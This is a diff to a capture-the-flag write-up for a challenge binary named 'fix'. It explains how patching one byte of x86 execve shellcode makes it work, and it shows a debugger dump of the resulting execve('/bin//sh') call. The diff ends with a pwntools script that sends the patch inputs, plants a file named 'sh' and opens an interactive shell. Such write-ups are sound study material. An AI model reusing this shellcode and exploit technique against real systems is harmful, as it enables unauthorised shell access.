@@ -1,5 +1,5 @@
 '''
-This is only a write-up of fix.
+This is write up for fix
 
 *(int*)(buf+32) = buf;      # buf: ebp-0x1C(28h) -> 32 = 28 + 4(retn addr)
 
@@ -78,7 +78,7 @@ modify the retn addr
 |        |  (ebp@shellcode-0x5) --- # The end of the shellcode 
 +--------+                       |
 |        |                       |
-+--------+                   0x4*3+1=13
++--------+                   0x4*3+1=13 which could only cover 3 pushes
 |ebp@main|  <- ebp@shellcode     |
 +--------+                       |
 |  retn  |  -----------------------
@@ -116,7 +116,7 @@ However when perform the pushing of the shellcode, we will have 5 pushes, so the
    f:   50                      push   eax
   10:   53                      push   ebx
   11:   89 e1                   mov    ecx, esp   // The code below this will be overwritten.
-  13:   b0 0b                   mov    al, 0xb
+  13:   b0 0b                   mov    al, 0xb    // execve()
   15:   cd 80                   int    0x80
 
 
@@ -157,5 +157,47 @@ Soluton 2：
   13:   b0 0b                   mov    al, 0xb
   15:   cd 80                   int    0x80
 
+eax: 0xb; ebx: *filename; ecx: argv[]; edx: envp[]
+
+ > 0xffcc3511    int    0x80 <SYS_execve>
+        path: 0xffcc3514 <- '/bin//sh'
+        argv: 0xffcc3538 -> 0xffcc3514 <- '/bin//sh'
+        envp: 0xf7f60890 (_IO_stdfile_1_lock) <- 0x0
+   0xffcc3513    add    byte ptr [edi], ch
+   0xffcc3515    bound  ebp, qword ptr [ecx + 0x6e]
+   0xffcc3518    das    
+   0xffcc3519    das    
+   0xffcc351a    jae    0xffcc3584
+--------------------------------------------------------------------------------------------------[ STACK ]--------------------------------------------------------------------------------------------------
+00:0000│ ecx esp  0xffcc3538 -> 0xffcc3514 <- '/bin//sh'                                                    # First agrv in ecx
+01:0004│          0xffcc353c -> 0xf7d9fe81 (__libc_start_main+241) <- add    esp, 0x10                      # Second argv in ecx (abnormal)
+02:0008│          0xffcc3540 -> 0xf7f5f000 (_GLOBAL_OFFSET_TABLE_) <- insb   byte ptr es:[edi], dx /* 0x1d7d6c */
+... ...
+04:0010│          0xffcc3548 <- 0x0
+05:0014│          0xffcc354c -> 0xf7d9fe81 (__libc_start_main+241) <- add    esp, 0x10
+06:0018│          0xffcc3550 <- 0x1
+07:001c│          0xffcc3554 -> 0xffcc35e4 -> 0xffcc53de <- '/home/bc7/Desktop/fix'
+
+correct:    execve("/bin//sh", ["/bin//sh", 0], 0)
+incorrect:  execve("/bin//sh", ["/bin//sh", xxxx], 0)
+modify:     execve("/bin//sh", ["/bin//sh", "sh"], 0)       # "sh" stands for "shell prompt"
 
 '''
+from pwn import *
+
+p = process("/home/fix/fix")
+p.recvuntil("fixed : ")
+p.sendline("15")
+p.recvuntil("patched : ")
+p.sendline("201")
+p.recvuntil("Can't open ")
+filename = p.recvline().strip("\n")
+with open(filename, "w") as f:
+    f.write("sh\n")
+p.kill()
+# Second execution
+p = process("/home/fix/fix")
+p.sendline("15")
+p.recvuntil("patched : ")
+p.sendline("201")
+p.interactive()
